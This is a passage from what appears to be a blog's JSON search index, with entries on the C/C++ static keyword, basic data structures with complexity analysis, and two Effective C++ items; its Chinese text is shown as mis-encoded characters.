staticåœ¨cé‡Œé¢å¯ä»¥ç”¨æ¥ä¿®é¥°å˜é‡ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥ä¿®é¥°å‡½æ•°ã€‚ å…ˆçœ‹ç”¨æ¥ä¿®é¥°å˜é‡çš„æ—¶å€™ã€‚å˜é‡åœ¨cé‡Œé¢å¯åˆ†ä¸ºå­˜åœ¨å…¨å±€æ•°æ®åŒºã€æ ˆå’Œå †é‡Œã€‚å…¶å®æˆ‘ä»¬å¹³æ—¶æ‰€è¯´çš„å †æ ˆæ˜¯æ ˆè€Œä¸åŒ…å«å¯¹ï¼Œä¸è¦å¼„æ··ã€‚ int a ; main() { int b ; int c* = (int *)malloc(sizeof(int)); } aæ˜¯å…¨å±€å˜é‡ï¼Œbæ˜¯æ ˆå˜é‡ï¼Œcæ˜¯å †å˜é‡ã€‚\nstaticå¯¹å…¨å±€å˜é‡çš„ä¿®é¥°ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯é™åˆ¶äº†åªèƒ½æ˜¯æœ¬æ–‡ä»¶å¼•ç”¨æ­¤å˜é‡ã€‚æœ‰çš„ç¨‹åºæ˜¯ç”±å¥½å¤š.cæ–‡ä»¶æ„æˆã€‚å½¼æ­¤å¯ä»¥äº’ç›¸å¼•ç”¨å˜é‡ï¼Œä½†åŠ å…¥staticä¿®é¥°ä¹‹åï¼Œåªèƒ½è¢«æœ¬æ–‡ä»¶ä¸­å‡½æ•°å¼•ç”¨æ­¤å˜é‡ã€‚\nstaticå¯¹æ ˆå˜é‡çš„ä¿®é¥°ï¼Œå¯ä»¥è®¤ä¸ºæ ˆå˜é‡çš„ç”Ÿå‘½å‘¨æœŸå»¶é•¿åˆ°ç¨‹åºæ‰§è¡Œç»“æŸæ—¶ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ ˆå˜é‡çš„ç”Ÿå‘½å‘¨æœŸç”±OSç®¡ç†ï¼Œåœ¨é€€æ ˆçš„è¿‡ç¨‹ä¸­ï¼Œæ ˆå˜é‡çš„ç”Ÿå‘½ä¹Ÿå°±ç»“æŸäº†ã€‚ä½†åŠ å…¥staticä¿®é¥°ä¹‹åï¼Œå˜é‡å·²ç»ä¸åœ¨å­˜å‚¨åœ¨æ ˆä¸­ï¼Œè€Œæ˜¯å’Œå…¨å±€å˜é‡ä¸€èµ·å­˜å‚¨ã€‚åŒæ—¶ï¼Œç¦»å¼€å®šä¹‰å®ƒçš„å‡½æ•°åä¸èƒ½ä½¿ç”¨ï¼Œä½†å¦‚å†æ¬¡è°ƒç”¨å®šä¹‰å®ƒçš„å‡½æ•°æ—¶ï¼Œå®ƒåˆå¯ç»§ç»­ä½¿ç”¨ï¼Œ è€Œä¸”ä¿å­˜äº†å‰æ¬¡è¢«è°ƒç”¨åç•™ä¸‹çš„å€¼ã€‚\nstaticå¯¹å‡½æ•°çš„ä¿®é¥°ä¸å¯¹å…¨å±€å˜é‡çš„ä¿®é¥°ç›¸ä¼¼ï¼Œåªèƒ½è¢«æœ¬æ–‡ä»¶ä¸­çš„å‡½æ•°è°ƒç”¨ï¼Œè€Œä¸èƒ½è¢«åŒä¸€ç¨‹åºå…¶å®ƒæ–‡ä»¶ä¸­çš„å‡½æ•°è°ƒç”¨ã€‚\nå°ç»“ static å£°æ˜çš„å˜é‡åœ¨Cè¯­è¨€ä¸­æœ‰ä¸¤æ–¹é¢çš„ç‰¹å¾ï¼š\nå˜é‡ä¼šè¢«æ”¾åœ¨ç¨‹åºçš„å…¨å±€å­˜å‚¨åŒºä¸­ï¼Œè¿™æ ·å¯ä»¥åœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨çš„æ—¶å€™è¿˜å¯ä»¥ä¿æŒåŸæ¥çš„èµ‹å€¼ã€‚è¿™ä¸€ç‚¹æ˜¯å®ƒä¸å †æ ˆå˜é‡å’Œå †å˜é‡çš„åŒºåˆ«ã€‚\nå˜é‡ç”¨staticå‘ŠçŸ¥ç¼–è¯‘å™¨ï¼Œè‡ªå·±ä»…ä»…åœ¨å˜é‡çš„ä½œç”¨èŒƒå›´å†…å¯è§ã€‚è¿™ä¸€ç‚¹æ˜¯å®ƒä¸å…¨å±€å˜é‡çš„åŒºåˆ«ã€‚\nä¾‹å­ [æ­£ç¡®] è‹¥å…¨å±€å˜é‡ä»…åœ¨å•ä¸ªCæ–‡ä»¶ä¸­è®¿é—®ï¼Œåˆ™å¯ä»¥å°†è¿™ä¸ªå˜é‡ä¿®æ”¹ä¸ºé™æ€å…¨å±€å˜é‡ï¼Œä»¥é™ä½æ¨¡å—é—´çš„è€¦åˆåº¦ï¼›\n[æ­£ç¡®] è‹¥å…¨å±€å˜é‡ä»…ç”±å•ä¸ªå‡½æ•°è®¿é—®ï¼Œåˆ™å¯ä»¥å°†è¿™ä¸ªå˜é‡æ”¹ä¸ºè¯¥å‡½æ•°çš„é™æ€å±€éƒ¨å˜é‡ï¼Œä»¥é™ä½æ¨¡å—é—´çš„è€¦åˆåº¦ï¼›\n[æ­£ç¡®] è®¾è®¡å’Œä½¿ç”¨è®¿é—®åŠ¨æ€å…¨å±€å˜é‡ã€é™æ€å…¨å±€å˜é‡ã€é™æ€å±€éƒ¨å˜é‡çš„å‡½æ•°æ—¶ï¼Œéœ€è¦è€ƒè™‘é‡å…¥é—®é¢˜ï¼›\n[é”™è¯¯] é™æ€å…¨å±€å˜é‡è¿‡å¤§ï¼Œå¯é‚£ä¼šå¯¼è‡´å †æ ˆæº¢å‡ºã€‚\nunsigned int sum_int( unsigned int base ) { unsigned int index; static unsigned int sum = 0; // æ³¨æ„ï¼Œæ˜¯staticç±»å‹çš„ã€‚ for (index = 1; index \u0026lt;= base; index++) { sum += index; } return sum; }\ræ‰€è°“çš„å‡½æ•°æ˜¯å¯é‡å…¥çš„ï¼ˆä¹Ÿå¯ä»¥è¯´æ˜¯å¯é¢„æµ‹çš„ï¼‰ï¼Œå³ï¼šåªè¦è¾“å…¥æ•°æ®ç›¸åŒå°±åº”äº§ç”Ÿç›¸åŒçš„è¾“å‡ºã€‚\nè¿™ä¸ªå‡½æ•°ä¹‹æ‰€ä»¥æ˜¯ä¸å¯é¢„æµ‹çš„ï¼Œå°±æ˜¯å› ä¸ºå‡½æ•°ä¸­ä½¿ç”¨äº†staticå˜é‡ï¼Œå› ä¸ºstaticå˜é‡çš„ç‰¹å¾ï¼Œè¿™æ ·çš„å‡½æ•°è¢«ç§°ä¸ºï¼šå¸¦â€œå†…éƒ¨å­˜å‚¨å™¨â€åŠŸèƒ½çš„çš„å‡½æ•°ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¯é‡å…¥çš„å‡½æ•°ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬ä¸€å®šè¦é¿å…å‡½æ•°ä¸­ä½¿ç”¨staticå˜é‡ï¼Œè¿™ç§å‡½æ•°ä¸­çš„staticå˜é‡ï¼Œä½¿ç”¨åŸåˆ™æ˜¯ï¼Œèƒ½ä¸ç”¨å°½é‡ä¸ç”¨ã€‚\nå°†ä¸Šé¢çš„å‡½æ•°ä¿®æ”¹ä¸ºå¯é‡å…¥çš„å‡½æ•°å¾ˆç®€å•ï¼Œåªè¦å°†å£°æ˜sumå˜é‡ä¸­çš„staticå…³é”®å­—å»æ‰ï¼Œå˜é‡sumå³å˜ä¸ºä¸€ä¸ªauto ç±»å‹çš„å˜é‡ï¼Œå‡½æ•°å³å˜ä¸ºä¸€ä¸ªå¯é‡å…¥çš„å‡½æ•°ã€‚\nå½“ç„¶ï¼Œæœ‰äº›æ—¶å€™ï¼Œåœ¨å‡½æ•°ä¸­æ˜¯å¿…é¡»è¦ä½¿ç”¨staticå˜é‡çš„ï¼Œæ¯”å¦‚å½“æŸå‡½æ•°çš„è¿”å›å€¼ä¸ºæŒ‡é’ˆç±»å‹æ—¶ï¼Œåˆ™å¿…é¡»æ˜¯staticçš„å±€éƒ¨å˜é‡çš„åœ°å€ä½œä¸ºè¿”å›å€¼ï¼Œè‹¥ä¸ºautoç±»å‹ï¼Œåˆ™è¿”å›ä¸ºé”™æŒ‡é’ˆã€‚\nå…¨å±€å˜é‡ä»¥åŠå…¨å±€å˜é‡ä¸é™æ€å˜é‡çš„å…³ç³»ï¼š é¡¾åæ€ä¹‰ï¼Œå…¨å±€å˜é‡æ˜¯æŒ‡èƒ½å¤Ÿåœ¨å…¨å±€å¼•ç”¨çš„å˜é‡ï¼Œç›¸å¯¹äºå±€éƒ¨å˜é‡çš„æ¦‚å¿µï¼Œä¹Ÿå«å¤–éƒ¨å˜é‡ï¼›åŒé™æ€å˜é‡ä¸€æ ·ï¼Œå…¨å±€å˜é‡ä½äºé™æ€æ•°æ®åŒºï¼Œå…¨å±€å˜é‡ä¸€å¤„å®šä¹‰ï¼Œå¤šå¤„å¼•ç”¨ï¼Œç”¨å…³é”®å­—â€œexternâ€å¼•ç”¨â€œå¤–éƒ¨â€çš„å˜é‡ã€‚ å…¨å±€å˜é‡ä¹Ÿå¯ä»¥æ˜¯é™æ€çš„ï¼Œåœ¨å‰é¢æœ‰è¿‡è¯´æ˜ï¼Œé™æ€å…¨å±€å˜é‡çš„æ„ä¹‰å°±æ˜¯ä¸è®©â€œå¤–éƒ¨â€å¼•ç”¨ï¼Œæ˜¯å•ä¸ªæºæ–‡ä»¶é‡Œçš„å…¨å±€å˜é‡ï¼Œå³æ˜¯ç¼–è¯‘é˜¶æ®µçš„å…¨å±€å˜é‡ï¼Œè€Œä¸æ˜¯è¿æ¥é˜¶æ®µçš„å…¨å±€å˜é‡ã€‚\nCode #include \u0026lt;iostream\u0026gt;\rusing namespace std;\rclass TestStatic\r{\rpublic:\rTestStatic() : y(1), r(y), d(3),private_y(4){++c;} //å¯¹äºå¸¸é‡å‹æˆå‘˜å˜é‡å’Œå¼•ç”¨å‹æˆå‘˜å˜é‡ï¼Œå¿…é¡»é€šè¿‡å‚æ•°åŒ–åˆ—è¡¨çš„æ–¹å¼è¿›è¡Œåˆå§‹åŒ–ã€‚\r~TestStatic(){}\rint y; //æ™®é€šå˜é‡æˆå‘˜\rint \u0026amp;r; //å¼•ç”¨æˆå‘˜å˜é‡\rconst int d; //å¸¸é‡æˆå‘˜å˜é‡\rstatic int c; //é™æ€æˆå‘˜å˜é‡\rstatic const int x; //é™æ€å¸¸é‡æ•´å‹æˆå‘˜å˜é‡\rstatic void testStaticFunErr() {\rstd::cout \u0026lt;\u0026lt; std::endl;\r}\rstatic void testStaticFun() {\rstd::cout \u0026lt;\u0026lt; \u0026quot;Call Static Function: \u0026quot; \u0026lt;\u0026lt; xx \u0026lt;\u0026lt; std::endl;\r}\rprivate:\rint private_y;\rstatic const int xx; //é™æ€å¸¸é‡æ•´å‹æˆå‘˜å˜é‡å£°æ˜\rstatic const double z; //é™æ€å¸¸é‡éæ•´å‹æˆå‘˜å˜é‡å£°æ˜\rstatic const float zz; //é™æ€å¸¸é‡éæ•´å‹æˆå‘˜å˜é‡\r};\rconst int TestStatic::xx = 4; //é™æ€å¸¸é‡æ•´å‹æˆå‘˜å˜é‡å®šä¹‰\rconst double TestStatic::z = 5.1; ////é™æ€å¸¸é‡éæ•´å‹æˆå‘˜å˜é‡å®šä¹‰\rint TestStatic::c = 2;\r// int TestStatic::x;\rconst int TestStatic::x = 5;\rint main(void)\r{\rTestStatic a, b, c;\rstd::cout \u0026lt;\u0026lt; \u0026quot;Class Static variable x:\u0026quot; \u0026lt;\u0026lt; TestStatic::x \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;Class Static variable c:\u0026quot; \u0026lt;\u0026lt; TestStatic::c \u0026lt;\u0026lt; std::endl; return 0;\r}\r","date":1537279200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537279200,"objectID":"2bb043d0607dec279507503c210dd26b","permalink":"http://www.guozet.me/post/C++-Static-keyword/","publishdate":"2018-09-18T14:00:00Z","relpermalink":"/post/C++-Static-keyword/","section":"post","summary":"C++ä¸­Staticå…³é”®å­—çš„åº”ç”¨ ç”±äºC++æ˜¯ä¸€ç§æºè‡ªäºCçš„è¯­","tags":"C++","title":"C++ Staticå…³é”®å­—çš„ç”¨æ³•è¯´æ˜","type":"post"},{"authors":null,"categories":"Algorithm","content":"Algorithm Introduce What is a good Algorithm? (Cite from: Brian C. Dean )\nAlways terminates and produces correct output. Make efficient use of computational resources. Minimizes running time, memory usage, processors, bandwidth, power consumed, heat produced. Is simple to describe, understand, analyze, implement, and debug For example: Linear search:\nfor (int i = 0; i\u0026lt;N; i++) { if (target == A[i]) {found it!} } Binary search:\nlow = 0; high = N-1; while (low \u0026lt;= high) { mid = (low + high) / 2; if (target == A[mid]) { found it! } if (target \u0026gt; A[mid]) low = mid+1; else high = mid-1; } Linear search: O(N) time. Binary search: O(log N) time.\nRunning time What is the Linear search: O(N) time. meaning in the above? We usually use asymptotic notation to describe how running time scales with input size.\nO(f(N)) means â€œupper-bounded by a constant times f(N) as N grows largeâ€. Just like, if the input of size is N, then the take about nN machine instructions, then we can say it runs in O(N) time.\nThere are other two symbol which are used for discribe the running time scales with input size.\nÎ©() provides an asymptotic lower bound. Î˜() means both a lower and upper bound. Arrays, Listed lists Arrays After you define the size of the arrays, you can change the size of the array at the running time. You just can allocate for a new arrays at the running time and copy the old one to the new one.\n/* Statically defined (size known at compile time) */ int A[100]; int B[100] = {1, 2, 3}; /* Dynamically allocated at run time */ int *C = (int *)malloc(100 * sizeof(int)); int *D = new int[100]; /* A[], C[], and D[] filled with garbage until initialized */ /* Remember pointers can be used as arrays -- e.g., C[7] */ /* Donâ€™t forget to free memory for C and D... */ free (C); delete [] D; Analyze:\nRetrieve or modify any element in O(1) time. Insert or delete in middle of list: O(N) time. Insert or delete from ends: O(1) time Linked Lists /* In C, typically use â€œtypedef struct...â€ */ struct Node { int payload; Node *next; } int list_length(Node *n) { int count = 0; while (n != NULL) { count++; n = n-\u0026gt;next; } return count; } TODO:\nTask1:Write the doubly linked lists. Write a list which maintain a pointer to the first and last element. Analyze:\nSeek to any position in list: O(N) time. Then insert or delete element: O(1) time. Insert or delete from ends: O(1) time. Circular Arrays, Queues void enqueue(int x) { A[front] = x; front = (front+1) % N; } int dequeue(void) { int result = A[back]; back = (back+1) % N; return result; } Stacks void push(int x) { A[top++] = x; } int pop(void) { return A[--top]; } void what_does_this_do(int n) { if (n==0) return; printf (â€œ%d\\nâ€, n); what_does_this_do(n-1); printf (â€œ%d\\nâ€, n); } Arrays Vs Lists Example We can use a example(From Brian. Dean) to introduce the running time abou the Arrays and Lists.\nIn the file studens.txt have a lot of students information about their name. Like this follow:\nSebastian Valentin Jeffrey Wang Jacob William *** Question:\nWrite for me a program in C++ that takes as input a list of names, and prints out each name that appears in the list multiple times.\nArrays Solution:\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; using namespace std; string *name; int N; // how many elements we've actually read from the file int allocated; // how much memory we've allocated int num_occurences(string s) { int count = 0; for (int i=0; i\u0026lt;N; i++) if (name[i] == s) count++; return count; } int main (void) { string fname, lname; ifstream fin(\u0026quot;students.txt\u0026quot;); name = new string[4]; allocated = 4; // start with array of size 4 // (this is somewhat arbitrary; any small constant would be fine) while (fin \u0026gt;\u0026gt; fname \u0026gt;\u0026gt; lname) { if (num_occurences(fname) == 1) // O(n) time cout \u0026lt;\u0026lt; fname \u0026lt;\u0026lt; \u0026quot;\\n\u0026quot;; // Check if we need to transfer our array into a new larger array if (N == allocated) { string *newarray = new string[allocated * 2]; for (int i=0; i\u0026lt;N; i++) newarray[i] = name[i]; delete [] name; // old array not needed any more; free it... name = newarray; allocated = allocated * 2; // now name points to the new array, which is twice as big and // contains all the N elements we've read so far... } name[N++] = fname; } return 0; } List Solution\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; using namespace std; struct Node { string name; Node *next; Node (string s, Node *n) { name = s; next = n; } }; int num_occurences(Node *head, string s) { int count = 0; Node *n = head; while (n != NULL) { if (n-\u0026gt;name == s) count++; n = n-\u0026gt;next; } return count; } int main (void) { string fname, lname; ifstream fin(\u0026quot;students.txt\u0026quot;); Node *head = NULL; while (fin \u0026gt;\u0026gt; fname \u0026gt;\u0026gt; lname) { if (num_occurences(head, fname) == 1) // O(n) cout \u0026lt;\u0026lt; fname \u0026lt;\u0026lt; \u0026quot;\\n\u0026quot;; head = new Node(fname, head); } return 0; } ","date":1537236571,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537236571,"objectID":"f663432013655dedb40ce409593b0862","permalink":"http://www.guozet.me/post/CPSC2120-Algorithm-Introduce/","publishdate":"2018-09-18T02:09:31Z","relpermalink":"/post/CPSC2120-Algorithm-Introduce/","section":"post","summary":"Algorithm Introduce What is a good Algorithm? (Cite from: Brian C. Dean )\nAlways terminates and produces correct output. Make efficient use of computational resources. Minimizes running time, memory usage, processors, bandwidth, power consumed, heat produced. Is simple to describe, understand, analyze, implement, and debug ","tags":"Algorithm","title":"Algorithm Introduce1-Basic Data Structure","type":"post"},{"authors":null,"categories":"EffectiveC++","content":"View C++ as a federation of Languages In the begining, C++ was just C with some object-oriented features tacked on. c++ = C with classes. ä½†æ˜¯åˆ°äº†åæ¥ï¼ŒC++å°±åŒ…å«äº†å¾ˆå¤šå¤æ‚çš„äº‹ç‰©ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨C++çš„æ—¶å€™å¯ä»¥å°†å…¶çœ‹æˆå››ç§ä¸åŒçš„ä½¿ç”¨æ–¹å¼ã€‚\nCè¯­è¨€ã€‚ æŒ‰ç…§Cè¯­è¨€çš„è§„åˆ™å»ä½¿ç”¨ï¼Œæ²¡æœ‰æ¨¡æ¿ï¼Œæ²¡æœ‰å¼‚å¸¸ï¼Œæ²¡æœ‰é‡è½½ Object-Oriented C+ã€‚è¿™ä¸€éƒ¨åˆ†æ˜¯C with CLassesæ‰€è¿½æ±‚çš„ï¼Œclasses, encapsulation, inheritance, polymorphism, virtualã€‚æŒ‰ç…§é¢å‘å¯¹è±¡çš„è®¾è®¡å‡†åˆ™å»åšå°±å¥½äº† Template C++. æ³›å‹ç¼–ç¨‹ STLã€‚STLæ˜¯ä¸€ä¸ªtemplateç¨‹åºåº“ï¼Œå¯¹containers, iterators, algorithms å’Œ Function objectsè¿›è¡Œäº†é™åˆ¶ã€‚å¦‚æœåœ¨ç¼–ç¨‹ä¸­ä½¿ç”¨äº†STL, é‚£å°±å¿…é¡»éµå®ˆSTLçš„è§„åˆ™ å½“ä½ ä½¿ç”¨åˆ°å…¶ä¸­çš„å‡ ç§æ–¹å¼çš„æ—¶å€™ï¼Œè¦ä¹ æƒ¯å¯¹è‡ªå·±çš„ç¼–ç¨‹æ–¹å¼è¿›è¡Œæ›´æ¢\n","date":1536631771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536631771,"objectID":"339d2dfa60b8fea7f876cb5816f696e3","permalink":"http://www.guozet.me/post/EffectiveC++-item1/","publishdate":"2018-09-11T02:09:31Z","relpermalink":"/post/EffectiveC++-item1/","section":"post","summary":"View C++ as a federation of Languages In the begining, C++ was just C with some object-oriented features tacked on. c++ = C with classes. ä½†æ˜¯åˆ°äº†åæ¥ï¼ŒC++å°±åŒ…å«äº†å¾ˆå¤šå¤æ‚çš„äº‹ç‰©ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨C++çš„æ—¶å€™å¯ä»¥å°†å…¶çœ‹æˆå››ç§ä¸åŒçš„ä½¿ç”¨æ–¹å¼ã€‚\n","tags":"EffectiveC++","title":"Book. Effective C++ item1-View C++ as a federatime of languages","type":"post"},{"authors":null,"categories":"EffectiveC++","content":"Introduce ##å¸¸è§„å˜é‡\nc++é‡Œé¢çš„#defineåé¢çš„å®šä¹‰éƒ¨åˆ†ï¼Œæ˜¯ä¸ç®—ä»£ç çš„ä¸€éƒ¨åˆ†çš„ã€‚æ‰€ä»¥å¦‚æœä½ ä½¿ç”¨#define:\n#define ASPECT_RATIO 1.653\nä½ å¸Œæœ›è¿™ä¸ªä»£å·ASPECT RATIOè¿™ä¸ªä»£å·æ˜¯èƒ½å¤Ÿè¢«ç¼–è¯‘å™¨åŠ å…¥åˆ°è®°å·è¡¨ï¼ˆsymbol tableï¼‰é‡Œé¢ï¼Œå¦‚æœè°ƒè¯•çš„æ—¶å€™ï¼Œè¿™ä¸ªéƒ¨åˆ†å‡ºç°é—®é¢˜ï¼Œèƒ½å¤Ÿå¾ˆå¿«çš„å‘ç°å‡ºæ¥ã€‚ä½†æ˜¯å¾ˆå¤šæ—¶å€™æˆ‘ä»¬çš„é¢„å¤„ç†å™¨ä¼šæŠŠè¿™ä¸ªå˜é‡ç§»é™¤ï¼Œåªä¿ç•™äº†ä¸€ä¸ª1.653çš„å¸¸é‡ï¼Œå¦‚æœDebugçš„æ—¶å€™è¿™ä¸ªå¸¸é‡å‡ºç°äº†é”™è¯¯ï¼Œä½ æ˜¯å¾ˆéš¾å®šä½åˆ°è‡ªå·±éœ€è¦ä¿®æ”¹ä»£ç çš„åœ°æ–¹çš„ï¼Œè¿™å°±ä¼šé€ æˆæˆ‘ä»¬åœ¨ä½¿ç”¨ä¸­Debugçš„æ—¶å€™å¾ˆä¸æ–¹ä¾¿ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦å¤–çš„æ–¹å¼æ¥å®šä¹‰\nconst double AspectRatio = 1.653; ä¿®æ”¹ä¹‹åï¼ŒAspectRatioè¿™ä¸ªå¸¸é‡è‚¯å®šä¼šå†™å…¥åˆ°è®°å·è¡¨é‡Œé¢ï¼Œæ˜¯å¯ä»¥è¢«ç¼–è¯‘å™¨æ‰¾åˆ°çš„ã€‚å¦å¤–ä½¿ç”¨#define å¯èƒ½ä¼šé€ æˆæˆ‘ä»¬çš„ä»£ç é‡Œé¢æœ‰å¾ˆå¤šçš„object code ä¸º 1.653, ä½†æ˜¯ä½¿ç”¨constçš„æ–¹å¼ï¼Œæˆ‘ä»¬çš„ä»£ç é‡Œé¢å°±åªä¼šæœ‰ä¸€ä¸ªAspectRatioã€‚\nå¦‚æœæ˜¯å¸¸é‡æŒ‡é’ˆ(constant pointers), ç”±äºæˆ‘ä»¬çš„å¸¸é‡ä¸€èˆ¬æ˜¯å®šä¹‰åœ¨å¤´æ–‡ä»¶ä¸­çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æŒ‡é’ˆå£°æ˜ä¸ºconstã€‚å¦‚ï¼š\nconst char* const authorName = \u0026quot;Scott Meyers\u0026quot;;\nè¿™é‡Œå¯ä»¥ä¿®æ”¹ä¸ºStringç±»å‹ï¼Œä½¿ç”¨Stringæ¥å­˜å‚¨å­—ç¬¦ä¸²ä¼šæ¯”char*æ›´åŠ çš„åˆé€‚ï¼Œå¯å®šä¹‰ä¸ºconst std::string authorName(\u0026quot;Scott Meyers\u0026quot;);\nClasså†…éƒ¨ä¸“å±å˜é‡ **é—®é¢˜ï¼š**é™åˆ¶å¸¸é‡çš„ä½œç”¨åŸŸæ˜¯åœ¨Classå†…éƒ¨ï¼Œè¿™æ ·å°±è¦å°†è¿™ä¸ªå¸¸é‡ä½œä¸ºClassçš„ä¸€ä¸ªmembeerï¼Œ è¿™æ ·å°±èƒ½å¤Ÿç¡®ä¿è¿™ä¸ªå¸¸é‡è‡³å¤šåªæœ‰ä¸€ä¸ªå®ä½“ï¼Œå¹¶ä¸”å¿…é¡»å°†å…¶å£°æ˜ä¸ºstatic memberã€‚\nclass GamePlayer { private: static const int NumTurns = 5; //å¸¸é‡å£°æ˜ int scores[NumTurns]; } å› ä¸ºè¿™é‡Œé¢static const int NumTurns = 5;è¿™æ˜¯æ”¾åœ¨ç±»çš„å£°æ˜é‡Œé¢çš„ï¼Œåœ¨è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå˜é‡çš„å£°æ˜ï¼Œå¹¶ä¸æ˜¯å˜é‡çš„å®šä¹‰ï¼Œåœ¨å†…å­˜é‡Œé¢æ˜¯æ²¡æœ‰çš„ã€‚ä½†æ˜¯c++å¦‚æœä½ åœ¨å…¶ä»–åœ°æ–¹å»ä½¿ç”¨çš„è¯ï¼Œé‚£æ˜¯éœ€è¦æˆ‘ä»¬å¯¹è¿™ä¸ªè¿›è¡Œå…ˆå®šä¹‰åœ¨ä½¿ç”¨çš„ã€‚å¦‚æœè¦åœ¨å…¶ä»–åœ°æ–¹ä½¿ç”¨ï¼Œå°±éœ€è¦æä¾›ä¸€ä¸ªå®šä¹‰ï¼š\nconst int GamePlayer::Numturns;\nè¿™ä¸ªå°±å¯ä»¥æ”¾åœ¨ä½ éœ€è¦ä½¿ç”¨GamePlayer::NumTurnsè¿™ä¸ªå˜é‡çš„æ–‡ä»¶é‡Œé¢ï¼Œæ”¾åœ¨*.cppæ–‡ä»¶é‡Œï¼Œè€Œä¸æ˜¯*.hæ–‡ä»¶ä¸­ã€‚\n**æ³¨æ˜:**ç”±äºåœ¨ç±»çš„å£°æ˜ä¸­å·²ç»ç»™GamePlayer::NumTurnsè¿›è¡Œäº†èµ‹å€¼æ“ä½œï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå•ç‹¬ç›´æ¥å®šä¹‰å°±å¯ä»¥è°ƒç”¨å£°æ˜è¿›è¡Œèµ‹å€¼æ“ä½œã€‚\nå¦å¤–ä¸€ç§é’ˆå¯¹è€å¼ç¼–è¯‘å™¨ä¸æ”¯æŒä¸Šè¿°è¯­æ³•çš„è§£å†³æ–¹æ³•ï¼š\n//åœ¨å¤´æ–‡ä»¶ä¸­ class CostEstimate { private: static const double FudgeFactor; //static class å¸¸é‡å£°æ˜ ... } //åœ¨å®ç°æ–‡ä»¶ä¸­å»åš const double CostEstimate::FudgeFactor = 1.35; ä¸Šé¢è¿™ç§æ–¹å¼å¯èƒ½é—®é¢˜ï¼šclassåœ¨ç¼–è¯‘åŒºé—´éœ€è¦ä¸€ä¸ªclassçš„é•¿ä¸¤åªï¼Œå°±æ˜¯ç¼–è¯‘å™¨ä¸å…è®¸static const int a å®Œæˆåˆå§‹è®¾å®šï¼Œè¿™æ ·æˆ‘ä»¬å°±è¦ä½¿ç”¨åˆ° the enum hackçš„æ–¹å¼è¿›è¡Œè¡¥å¿ã€‚ç†è®ºï¼šä¸€ä¸ªå±äºenumerated typeçš„æ•°å€¼æ˜¯å¯ä»¥å½“æˆintsæ¥ä½¿ç”¨çš„\nclass GamePlayer { private: enum {NumTurns = 5}; int scores[Numturns]; } è¯´æ˜ï¼š emum hackå®šä¹‰çš„å†…å®¹ï¼Œæ˜¯ä¸èƒ½å¤Ÿå–åœ°å€çš„ï¼Œå–åœ°å€çš„æ“ä½œæ˜¯ä¸åˆæ³•çš„ï¼Œè€Œå–#defineçš„åœ°å€ä¹Ÿæ˜¯ä¸åˆæ³•çš„ï¼Œä½†æ˜¯å–ä¸€ä¸ªconstçš„åœ°å€æ˜¯åˆæ³•çš„ã€‚å¦‚æœä¸æƒ³è®©å…¶ä»–äººè·å¾—è¿™ä¸ªpointeræˆ–è€…referenceæŒ‡å‘ä½ çš„æ•´æ•°å˜é‡ï¼Œenumå°±å¯ä»¥å¾ˆå¥½çš„å®ç°è¿™ä¸ªåŠŸèƒ½ã€‚\nemumå’Œ#defineæ˜¯ç»å¯¹ä¸ä¼šå¯¼è‡´éå¿…è¦çš„å†…å­˜åˆ†é…çš„ã€‚\nå®ç°å®å®šä¹‰ å®å®šä¹‰çœ‹èµ·æ¥åƒä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯ä¸ä¼šå¯¼è‡´å‡½æ•°çš„è°ƒç”¨å¯¼è‡´çš„é¢å¤–å¼€é”€ï¼Œæ¯”å¦‚ï¼š\n#define CALL_WITH_MAX(a,b) f((a) \u0026gt; (b) ?(a):(b)ï¼‰\né¦–å…ˆï¼Œå†™è¿™æ ·çš„å®å¿…é¡»ä¸ºæ‰€æœ‰çš„å®å‚éƒ½åŠ ä¸Šå°æ‹¬å·ï¼Œå¦åˆ™å…¶ä»–åœ°æ–¹è°ƒç”¨çš„æ—¶å€™ä¼šå‡ºç°é—®é¢˜ã€‚ä½†å³ä½¿åŠ ä¸Šäº†ï¼Œå¦‚æœä½ å®ç°è¿™æ ·çš„ä»£ç ï¼š\nint a = 5, b = 0; CALL_WITH_MAX(++a,b); CALL_WITH_MAX(++a,b+10); åœ¨è°ƒç”¨ä¹‹å‰ï¼Œaä¼šé€’å¢ä¹‹ååœ¨å»è°ƒç”¨ï¼Œå¹¶ä¸”æ˜¯å¦é€’å¢å–å†³ä¸å®ƒå’Œè°æ¯”è¾ƒã€‚\nå°ç»“ å¯¹äºå•çº¯å˜é‡ï¼Œä½¿ç”¨constå¯¹è±¡æˆ–è€…enumsæ›¿æ¢#define å½¢å¦‚å‡½æ•°çš„å®ï¼Œä¿®æ”¹ä¸ºinlineå‡½æ•°æ›¿æ¢#define ","date":1536631771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536631771,"objectID":"1271a52b78f1f73ce0ab7a0cac5eaff0","permalink":"http://www.guozet.me/post/EffectiveC++-item2/","publishdate":"2018-09-11T02:09:31Z","relpermalink":"/post/EffectiveC++-item2/","section":"post","summary":"Introduce ##å¸¸è§„å˜é‡ c++é‡Œé¢çš„#defineåé¢çš„å®šä¹‰éƒ¨åˆ†ï¼Œæ˜¯ä¸","tags":"EffectiveC++","title":"Book. Effective C++ item2-å°½é‡ä½¿ç”¨const, enum, inlineæ›¿æ¢#define","type":"post"},{"authors":null,"categories":"C++","content":"ä»‹ç» åœ¨C++è¯­è¨€ä¸­int 